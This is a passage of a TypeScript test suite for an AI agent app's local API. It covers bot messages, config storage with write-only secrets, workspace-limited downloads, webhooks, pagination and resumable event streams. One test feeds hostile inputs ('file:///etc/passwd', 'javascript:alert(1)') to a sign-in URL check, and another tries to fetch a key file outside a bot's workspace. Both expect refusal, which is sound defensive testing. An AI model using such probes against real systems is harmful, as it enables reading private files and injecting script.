    const card = bot.messages.find((m: { kind: string }) => m.kind === "options");
    const res = await api("PATCH", `/api/bots/${bot.id}/cards/${card.id}`, { answered: card.card.options[0] });
    expect(res.status).toBe(200);
    expect(res.body.message.card.answered).toBe(card.card.options[0]);
  });

  it("rejects an empty message and explains an unavailable provider", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];

    const empty = await api("POST", `/api/bots/${bot.id}/messages`, { text: "   " });
    expect(empty.status).toBe(400);

    // the seeded bot's selection points at the ghost instance — sending a
    // real message must fail loudly, not 202-and-hang
    const send = await api("POST", `/api/bots/${bot.id}/messages`, { text: "hello?" });
    expect(send.status).toBe(409);
    expect(send.body.error).toContain("unavailable");
  });

  it("remembers that PC Browser was switched on", async () => {
    // Regression: pcBrowser was accepted by the API and dropped by
    // saveConfig, so the toggle read back off the moment it was set and the
    // setting never survived a restart.
    const saved = await api("PATCH", "/api/config", {
      pcBrowser: { enabled: true, headless: false, cdpEndpoint: "" },
    });
    expect(saved.status).toBe(200);
    expect(saved.body.pcBrowser).toMatchObject({ enabled: true, headless: false });
    expect((await api("GET", "/api/config")).body.pcBrowser).toMatchObject({ enabled: true });
    await api("PATCH", "/api/config", { pcBrowser: { enabled: false, headless: false, cdpEndpoint: "" } });
  });

  it("accepts a requested bot name and refuses case-insensitive duplicates", async () => {
    const first = await api("POST", "/api/bots", { name: "Named bot" });
    expect(first.status).toBe(201);
    expect(first.body.bot.name).toBe("Named bot");
    const duplicate = await api("POST", "/api/bots", { name: "named BOT" });
    expect(duplicate.status).toBe(409);
    expect((await api("DELETE", `/api/bots/${first.body.bot.id}`)).status).toBe(200);
  });

  it("persists the fallback chain even when stale entries are filtered out", async () => {
    const saved = await api("PATCH", "/api/config", { fallbackChain: ["removed-engine"] });
    expect(saved.status).toBe(200);
    expect(saved.body.fallbackChain).toEqual([]);
    const disk = JSON.parse(readFileSync(join(home, ".mauscrew", "config.json"), "utf8"));
    expect(disk).toHaveProperty("fallbackChain", []);
  });

  it("offers a produced file for download, and refuses one outside the workspace", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const workspace = join(home, "download-workspace");
    mkdirSync(workspace, { recursive: true });
    writeFileSync(join(workspace, "report.xlsx"), "spreadsheet");
    writeFileSync(join(home, "outside.key"), "PRIVATE KEY");
    expect((await api("PATCH", `/api/bots/${bot.id}`, { workspacePath: workspace })).status).toBe(200);

    const offered = await api("POST", "/api/downloads", {
      botId: bot.id,
      path: join(workspace, "report.xlsx"),
      name: "report.xlsx",
    });
    expect(offered.status).toBe(200);
    expect(offered.body.url).toMatch(/^\/downloads\//);

    const download = await fetch(`${BASE}${offered.body.url}`);
    expect(download.status).toBe(200);
    expect(download.headers.get("content-disposition")).toContain('filename="report.xlsx"');
    expect(await download.text()).toBe("spreadsheet");

    // The path comes from model output, so this is the case that matters: a
    // bot naming a file outside its workspace gets a refusal, not the file.
    const refused = await api("POST", "/api/downloads", { botId: bot.id, path: join(home, "outside.key") });
    expect(refused.status).toBe(403);
    expect(refused.body.error).toContain("outside this MAUS's workspace");

    const missing = await fetch(`${BASE}/downloads/not-a-real-id`);
    expect(missing.status).toBe(404);
    expect((await api("POST", "/api/downloads", { botId: "nope", path: join(workspace, "report.xlsx") })).status).toBe(404);
    expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
  });

  it("guards the browser profile and host driver endpoints", async () => {
    const profile = await api("GET", "/api/browser-profile");
    expect(profile.status).toBe(200);
    expect(profile.body).toMatchObject({ signingIn: false, lastSeen: null });
    expect(profile.body.profilePath).toContain("pc-browser-profile");

    // The sign-in URL becomes a navigation in a window carrying this
    // profile's sessions, so the scheme is checked at the boundary.
    for (const url of ["file:///etc/passwd", "javascript:alert(1)", "", "not a url"]) {
      expect((await api("POST", "/api/browser-profile/sign-in", { url })).status).toBe(400);
    }

    // The host driver is the Linux path; everywhere else says so rather than
    // pretending to install something.
    const host = await api("GET", "/api/host-computer");
    expect(host.status).toBe(200);
    expect(typeof host.body.supported).toBe("boolean");
    if (process.platform !== "linux") {
      expect((await api("POST", "/api/host-computer/install", {})).status).toBe(409);
    }
  });

  it("validates direct turn redirects at the HTTP boundary", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    expect((await api("POST", `/api/bots/${bot.id}/steer`, { text: "" })).status).toBe(400);
    expect((await api("POST", "/api/bots/does-not-exist/steer", { text: "redirect" })).status).toBe(404);
    // Idle redirects use the ordinary turn path; this test fleet intentionally
    // has no runnable provider, so the route must surface that same conflict.
    expect((await api("POST", `/api/bots/${bot.id}/steer`, { text: "redirect" })).status).toBe(409);
  });

  it("refuses to fork a message when the provider is unavailable, without mutating", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    const before = bot.messages.length;

    // greeting is a bot message — not editable
    const greeting = bot.messages.find((m: { role: string }) => m.role === "bot");
    const notUser = await api("POST", `/api/bots/${bot.id}/messages/${greeting.id}/edit`, { text: "x" });
    expect(notUser.status).toBe(404);

    // no user message exists yet, so fabricate the check via the card id
    const card = bot.messages.find((m: { kind: string }) => m.kind === "options");
    const res = await api("POST", `/api/bots/${bot.id}/messages/${card.id}/edit`, { text: "x" });
    expect(res.status).toBe(404); // options card, not a user text message

    const empty = await api("POST", `/api/bots/${bot.id}/messages/${greeting.id}/edit`, { text: "  " });
    expect(empty.status).toBe(400);

    const after = await api("GET", "/api/bots");
    expect(after.body.bots[0].messages.length).toBe(before);
  });

  it("switches the active branch and reports the new leaf", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    expect(bot.activeLeafId).toBe(bot.messages.at(-1).id);

    // pointing at the first message descends back to the newest leaf on
    // that (only) branch — a no-op switch, but it exercises the descent
    const res = await api("POST", `/api/bots/${bot.id}/active-branch`, { messageId: bot.messages[0].id });
    expect(res.status).toBe(200);
    expect(res.body.activeLeafId).toBe(bot.messages.at(-1).id);

    const missing = await api("POST", `/api/bots/${bot.id}/active-branch`, { messageId: "nope" });
    expect(missing.status).toBe(404);
  });

  it("refuses a box token the provider rejects, at the point of pasting", async () => {
    // the stub answers 401 for anything but the good token
    const bad = await api("PUT", "/api/config", { box: { token: "box_wrong" } });
    expect(bad.status).toBe(400);
    expect(String(bad.body.error)).toMatch(/rejected/i);
    const after = await api("GET", "/api/config");
    expect(after.body.box).toEqual({ configured: false });
  });

  it("saves config keys write-only and reports booleans", async () => {
    const before = await api("GET", "/api/config");
    expect(before.body.box).toEqual({ configured: false });

    const put = await api("PUT", "/api/config", { box: { token: "box_good" } });
    expect(put.status).toBe(200);
    expect(put.body.box).toEqual({ configured: true });
    expect(JSON.stringify(put.body)).not.toContain("box_good");

    const after = await api("GET", "/api/config");
    expect(after.body.box).toEqual({ configured: true });
    expect(JSON.stringify(after.body)).not.toContain("box_good");

    const nothing = await api("PUT", "/api/config", {});
    expect(nothing.status).toBe(400);
  });

  it("validates a Composio project key, creates a Session, and keeps externally stored secrets off disk", async () => {
    const oldKey = await api("PUT", "/api/config", { composio: { apiKey: "old_key" } });
    expect(oldKey.status).toBe(400);
    expect(oldKey.body.error).toMatch(/start with ak_/i);

    const rejected = await api("PUT", "/api/config", { composio: { apiKey: "ak_wrong" } });
    expect(rejected.status).toBe(400);
    expect(rejected.body.error).toMatch(/invalid project key/i);

    const saved = await api("PUT", "/api/config?secretStorage=external", { composio: { apiKey: "ak_good" } });
    expect(saved.status).toBe(200);
    expect(saved.body.composio).toEqual({ configured: true, recoveryRequired: false });
    expect(JSON.stringify(saved.body)).not.toContain("ak_good");

    const disk = JSON.parse(readFileSync(join(home, ".mauscrew", "config.json"), "utf8"));
    expect(disk.composio).toMatchObject({ apiKey: "", sessionId: "trs_config_test" });
    expect(JSON.stringify(disk)).not.toContain("ak_good");

    // A later ordinary setting save reloads config; the in-process secure-env
    // override must keep Composio configured until the next app launch.
    expect((await api("PUT", "/api/config", { profile: { name: "Grace" } })).status).toBe(200);
    expect((await api("GET", "/api/config")).body.composio).toEqual({ configured: true, recoveryRequired: false });
  });

  it.skipIf(process.platform === "win32")("stores the credentials file with owner-only permissions", () => {
    expect(statSync(join(home, ".mauscrew", "config.json")).mode & 0o777).toBe(0o600);
  });

  it("stores and echoes the user profile (not write-only, unlike keys)", async () => {
    const put = await api("PUT", "/api/config", { profile: { name: "Ada Lovelace", email: "Ada@Example.com" } });
    expect(put.status).toBe(200);
    expect(put.body.profile).toEqual({ name: "Ada Lovelace", email: "Ada@Example.com" });

    const after = await api("GET", "/api/config");
    expect(after.body.profile).toEqual({ name: "Ada Lovelace", email: "Ada@Example.com" });
  });

  it("creates an independent webhook, accepts a delivery, deduplicates it, and rotates its secret", async () => {
    const bots = await api("GET", "/api/bots");
    const created = await api("POST", "/api/webhooks", {
      name: "Incoming build",
      prompt: "Review the incoming build event",
      botId: bots.body.bots[0].id,
      runOn: "maus",
    });
    expect(created.status).toBe(201);
    expect(created.body.ingress).toMatchObject({ available: true, baseUrl: WEBHOOK_BASE });
    expect(created.body.credential.url).toMatch(new RegExp(`^${WEBHOOK_BASE}/hooks/wh_`));

    const listed = await api("GET", "/api/webhooks");
    expect(listed.body.webhooks).toHaveLength(1);
    expect(listed.body.attempts).toEqual([]);
    expect(JSON.stringify(listed.body)).not.toContain(created.body.credential.secret);

    const deliver = () => fetch(created.body.credential.url, {
      method: "POST",
      headers: { "content-type": "application/json", "idempotency-key": "build-42" },
      body: JSON.stringify({ status: "failed", build: 42 }),
    });
    const first = await deliver();
    expect(first.status).toBe(202);
    const accepted = await first.json() as { runId: string; accepted: boolean; duplicate: boolean };
    expect(accepted).toMatchObject({ accepted: true, duplicate: false });
    const retry = await deliver();
    expect(retry.status).toBe(202);
    expect(await retry.json()).toMatchObject({ accepted: true, duplicate: true, runId: accepted.runId });

    const afterDelivery = await api("GET", "/api/webhooks");
    expect(afterDelivery.body.attempts.map((attempt: { outcome: string }) => attempt.outcome)).toEqual(["accepted", "duplicate"]);

    const receipts = await api("GET", "/api/routines");
    expect(receipts.body.runs.find((run: { id: string }) => run.id === accepted.runId)).toMatchObject({
      triggerSource: "webhook",
      deliveryId: "build-42",
      routineName: "Incoming build",
    });

    const rotated = await api("POST", `/api/webhooks/${created.body.webhook.id}/rotate`);
    expect(rotated.status).toBe(200);
    expect(rotated.body.credential.url).not.toBe(created.body.credential.url);
    expect((await deliver()).status).toBe(401);

    expect((await api("DELETE", `/api/webhooks/${created.body.webhook.id}`)).status).toBe(200);
    expect((await api("GET", "/api/webhooks")).body.webhooks).toHaveLength(0);
    if (process.platform !== "win32") {
      expect(statSync(join(home, ".mauscrew", "webhooks.json")).mode & 0o777).toBe(0o600);
    }
  });

  it("stores OpenCode Go credentials as a configured-only status", async () => {
    const put = await api("PUT", "/api/config", { opencodeGo: { apiKey: "opencode-secret" } });
    expect(put.status).toBe(200);
    expect(put.body.opencodeGo).toEqual({ configured: true });
    expect(JSON.stringify(put.body)).not.toContain("opencode-secret");

    const after = await api("GET", "/api/config");
    expect(after.body.opencodeGo).toEqual({ configured: true });
    expect(JSON.stringify(after.body)).not.toContain("opencode-secret");
  });

  it("rejects a non-string OpenCode Go API key", async () => {
    const bad = await api("PUT", "/api/config", { opencodeGo: { apiKey: 123 } });
    expect(bad.status).toBe(400);
    expect(bad.body.error).toContain("opencodeGo.apiKey");

    const array = await api("PUT", "/api/config", { opencodeGo: [] });
    expect(array.status).toBe(400);
    expect(array.body.error).toContain("opencodeGo");
  });

  it("never hands a client provider-native task bookkeeping", async () => {
    // resumeCursors is the harness's own bookkeeping. It reached clients for
    // a long time as harmless noise; once a phone is a client it is provider
    // session state leaving the machine, so nothing carrying a bot may have it.
    const listed = await api("GET", "/api/bots");
    for (const bot of listed.body.bots) {
      expect(bot).not.toHaveProperty("resumeCursors");
      for (const task of bot.tasks ?? []) {
        expect(task).not.toHaveProperty("resumeCursors");
        expect(task).not.toHaveProperty("lastInstanceId");
      }
    }

    const created = await api("POST", "/api/bots");
    const botId = created.body.bot.id;
    try {
      expect(created.body.bot).not.toHaveProperty("resumeCursors");
      const patched = await api("PATCH", `/api/bots/${botId}`, { name: "Cursorless" });
      expect(patched.body.bot).not.toHaveProperty("resumeCursors");

      const task = await api("POST", `/api/bots/${botId}/tasks`, {});
      expect(task.body.bot).not.toHaveProperty("resumeCursors");
      for (const t of task.body.bot.tasks ?? []) expect(t).not.toHaveProperty("resumeCursors");
      // the task alone, not just the bot it came attached to
      expect(task.body.task).not.toHaveProperty("resumeCursors");
      expect(task.body.task).not.toHaveProperty("lastInstanceId");
      const renamed = await api("PATCH", `/api/bots/${botId}/tasks/${task.body.task.threadId}`, {
        title: "Cursorless task",
      });
      expect(renamed.body.task).not.toHaveProperty("resumeCursors");

      // and the same on the wire, not just in the HTTP responses
      const stream = await openSse(`${BASE}/api/events`);
      try {
        await api("PATCH", `/api/bots/${botId}`, { unread: true });
        const frame = await stream.until((f) => f.kind === "bot");
        expect(frame.bot).not.toHaveProperty("resumeCursors");
        expect(JSON.stringify(frame)).not.toContain("resumeCursors");
      } finally {
        stream.close();
      }
    } finally {
      await api("DELETE", `/api/bots/${botId}`);
    }
  });

  it("404s unknown routes with the route in the error", async () => {
    const res = await api("GET", "/api/definitely-not-a-route");
    expect(res.status).toBe(404);
    expect(res.body.error).toContain("/api/definitely-not-a-route");
  });
});

// Hydration is one call that returns every bot's entire transcript. Over
// loopback that is right; over a phone network it is the whole problem.
describe("message pages", () => {
  /** A room whose default responder is mentions-only, posted to without any
   * mention: the user message lands and nothing answers it. That makes the
   * transcript exactly as long as we asked for — no bot turn racing the
   * assertions. */
  const seedRoom = async (count: number) => {
    const { body } = await api("GET", "/api/bots");
    const created = await api("POST", "/api/groups", { name: "Paging", memberIds: [body.bots[0].id] });
    expect(created.status).toBe(201);
    const groupId = created.body.group.id;
    const quiet = await api("PATCH", `/api/groups/${groupId}`, { defaultResponder: { kind: "mentions" } });
    expect(quiet.status).toBe(200);

    for (let i = 0; i < count; i++) {
      const posted = await api("POST", `/api/groups/${groupId}/messages`, { text: `page probe ${i}` });
      expect(posted.status).toBe(202);
    }
    const after = await api("GET", "/api/bots");
    return after.body.groups.find((g: { id: string }) => g.id === groupId);
  };

  it("returns the whole transcript when nothing is asked for", async () => {
    const room = await seedRoom(6);
    expect(room.messages).toHaveLength(6);
    // the original shape carries no pagination fields at all
    expect(room).not.toHaveProperty("hasMore");
  });

  it("returns only the newest n when asked", async () => {
    const full = await seedRoom(6);
    const { status, body } = await api("GET", "/api/bots?messages=2");
    expect(status).toBe(200);
    const slim = body.groups.find((g: { id: string }) => g.id === full.id);
    expect(slim.messages).toHaveLength(2);
    expect(slim.hasMore).toBe(true);
    // the newest two, not the oldest two
    expect(slim.messages.map((msg: { id: string }) => msg.id)).toEqual(
      full.messages.slice(-2).map((msg: { id: string }) => msg.id),
    );
    // and every 1:1 thread is capped by the same parameter
    expect(body.bots.every((b: { messages: unknown[] }) => b.messages.length <= 2)).toBe(true);
  });

  it("pages backwards from a message the client already holds", async () => {
    const full = await seedRoom(6);
    const fourth = full.messages[3];

    const { status, body } = await api("GET", `/api/threads/${full.threadId}/messages?before=${fourth.id}&limit=2`);
    expect(status).toBe(200);
    expect(body.messages.map((msg: { id: string }) => msg.id)).toEqual(
      full.messages.slice(1, 3).map((msg: { id: string }) => msg.id),
    );
    expect(body.hasMore).toBe(true);

    // walking back far enough reaches the top and says so
    const top = await api("GET", `/api/threads/${full.threadId}/messages?limit=200`);
    expect(top.body.hasMore).toBe(false);
    expect(top.body.messages).toHaveLength(6);
  });

  it("refuses a cursor or size it cannot page from", async () => {
    const full = await seedRoom(1);
    // silently answering with the newest page would paginate in a circle
    expect((await api("GET", `/api/threads/${full.threadId}/messages?before=nope`)).status).toBe(404);
    expect((await api("GET", "/api/threads/not-a-thread/messages")).status).toBe(404);
    expect((await api("GET", "/api/bots?messages=-1")).status).toBe(400);
    expect((await api("GET", "/api/bots?messages=lots")).status).toBe(400);
    expect((await api("GET", `/api/threads/${full.threadId}/messages?limit=1.5`)).status).toBe(400);
  });

  it("404s an image on a message that has none", async () => {
    const full = await seedRoom(1);
    const res = await fetch(`${BASE}/api/threads/${full.threadId}/messages/${full.messages[0].id}/image`);
    expect(res.status).toBe(404);
  });

  it("404s an image on a conversation that does not exist, without inventing one", async () => {
    // `messagesFor` materialises and caches a ThreadState for any id it is
    // given, so an unguarded route lets a client grow that map by asking
    // for threads that were never real. The 404 is the visible half; not
    // creating the thread is the half worth having.
    const before = (await api("GET", "/api/bots")).body.bots.length;
    const res = await fetch(`${BASE}/api/threads/not-a-thread/messages/not-a-message/image`);
    expect(res.status).toBe(404);
    expect(((await res.json()) as { error: string }).error).toBe("no such conversation");
    // and the phantom thread is not now answerable as an empty conversation
    expect((await api("GET", "/api/threads/not-a-thread/messages")).status).toBe(404);
    expect((await api("GET", "/api/bots")).body.bots.length).toBe(before);
  });
});

// A phone reconnects every time it unlocks, so "what did I miss?" has to
// be answerable without re-downloading every transcript.
describe("resumable event stream", () => {
  /** any request that makes the server broadcast exactly one frame */
  const nudge = async (botId: string) => {
    const res = await api("PATCH", `/api/bots/${botId}`, { unread: true });
    expect(res.status).toBe(200);
  };

  it("hands out a cursor and numbers every frame", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    const stream = await openSse(`${BASE}/api/events`);
    try {
      const hello = await stream.until((f) => f.kind === "hello");
      expect(hello.cursor).toMatch(/^[0-9a-f]{8}:\d+$/);
      // a cold connection offered no cursor, so there is nothing to resume
      expect(hello.resumed).toBe(false);

      await nudge(botId);
      await nudge(botId);
      // the PATCH response and the SSE frame travel on different sockets —
      // wait for the frames themselves rather than assuming they landed
      await stream.until(() => stream.frames.filter((f) => f.kind === "bot").length >= 2);
      const bots = stream.frames.filter((f) => f.kind === "bot");
      expect(bots[1].seq).toBeGreaterThan(bots[0].seq);
    } finally {
      stream.close();
    }
  });

  it("replays exactly what a disconnected client missed", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    const first = await openSse(`${BASE}/api/events`);
    const hello = await first.until((f) => f.kind === "hello");
    await nudge(botId);
    const seen = await first.until((f) => f.kind === "bot");
    first.close();
    // a real client advances its cursor as frames arrive — resume from the
    // last frame it actually saw, not from where it connected
    const cursor = `${hello.cursor.split(":")[0]}:${seen.seq}`;

    // ...three things happen while the phone is asleep...
    await nudge(botId);
    await nudge(botId);
    await nudge(botId);

    const resumed = await openSse(`${BASE}/api/events?since=${encodeURIComponent(cursor)}`);
    try {
      // ...and an old cursor still replays them, in order, without a hydrate
      const back = await resumed.until((f) => f.kind === "hello");
      expect(back.resumed).toBe(true);
      await resumed.until((f) => f.kind === "bot" && f.seq === seen.seq + 3);
      const replayed = resumed.frames.filter((f) => f.kind === "bot").map((f) => f.seq);
      expect(replayed).toEqual([seen.seq + 1, seen.seq + 2, seen.seq + 3]);
    } finally {
      resumed.close();
    }
  });

  it("resumes a browser EventSource through Last-Event-ID alone", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    const first = await openSse(`${BASE}/api/events`);
    const hello = await first.until((f) => f.kind === "hello");
    first.close();
    await nudge(botId);

    // the id: field is what a browser echoes back on its own reconnect
    const resumed = await openSse(`${BASE}/api/events`, { "last-event-id": hello.cursor });
    try {
      expect((await resumed.until((f) => f.kind === "hello")).resumed).toBe(true);
      await resumed.until((f) => f.kind === "bot");
    } finally {
      resumed.close();
    }
  });

  it("keeps delivering everything else when a client declines screen frames", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    // a phone on cellular opts out of the live desktop captures; nothing
    // else about its stream changes
    const stream = await openSse(`${BASE}/api/events?screens=off`);
    try {
      expect((await stream.until((f) => f.kind === "hello")).resumed).toBe(false);
      await nudge(botId);
      await stream.until((f) => f.kind === "bot");
      expect(stream.frames.some((f) => f.kind === "screen")).toBe(false);
    } finally {
      stream.close();
    }
  });

  it("refuses a cursor it cannot honour instead of replaying the wrong run", async () => {
    for (const cursor of ["deadbeef:1", "not-a-cursor", "12345678:999999"]) {
      const stream = await openSse(`${BASE}/api/events?since=${encodeURIComponent(cursor)}`);
      try {
        const hello = await stream.until((f) => f.kind === "hello");
        // false is the signal to hydrate — a partial replay would leave a
        // permanent hole in the client's state
        expect(hello.resumed).toBe(false);
      } finally {
        stream.close();
      }
    }
  });
});
